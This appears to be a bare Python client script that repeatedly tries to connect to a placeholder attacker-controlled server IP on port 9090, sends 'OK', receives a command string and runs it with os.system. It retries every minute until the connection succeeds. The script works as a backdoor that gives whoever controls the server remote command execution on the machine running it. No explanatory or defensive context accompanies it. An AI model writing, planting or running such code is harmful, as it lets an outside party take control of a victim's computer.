import socket
import os
import time

ip = "<your server-side ip goes here>"
port = 9090 

clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM);

connected = False

while not connected:
    try:
        clientSocket.connect((ip, port))
        connected = True

        data = "OK"
        clientSocket.send(data.encode())
        dataFromServer = clientSocket.recv(1024)
        command = dataFromServer.decode()
        os.system(command)
        clientSocket.close()
    except ConnectionRefusedError:
        print("Connection refused. Retrying again after 1 minute")
        time.sleep(60)
